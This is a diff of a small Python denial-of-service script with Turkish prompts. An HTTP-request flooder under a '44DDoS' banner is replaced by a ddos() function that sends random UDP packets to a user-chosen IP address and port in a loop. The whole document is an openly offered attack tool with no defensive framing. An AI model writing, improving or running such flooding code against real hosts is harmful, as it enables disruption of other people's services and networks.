@@ -1,34 +1,20 @@
-import requests
-import threading
-os.system("clear")
+import socket
+import random
+import time
 
-banner=" " "
+def ddos(ip, port):
+    data = random.randbytes(1024)
 
-#     44DDoS.      #
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.sendto(data, (ip, port))
+    sock.close()
 
-#coder-admin44#
-" " "
+if __name__ == "__main__":
+    ip = input("Hedef IP adresi: ")
+    port = int(input("Hedef port numarası: "))
+    count = int(input("Kaç paket gönderilsin: "))
 
-print (banner)
-
-target_ip = input("Hedef IP adresi: ")
-
-
-target_port = input("Hedef port numarası: ")
-
-
-connection_count = int(input("Bağlantı isteği sayısı: "))
-
-def connection_request():
-    requests.get(f"https://{target_ip}:{target_port}")
-
-
-threads = []
-for i in range(connection_count):
-    thread = threading.Thread(target=connection_request)
-    threads.append(thread)
-    thread.start()
-
-
-for thread in threads:
-    thread.join()
+    for i in range(count):
+        print(f"Paket gönderiliyor: {i+1}/{count}")
+        ddos(ip, port)
+        time.sleep(0.1)
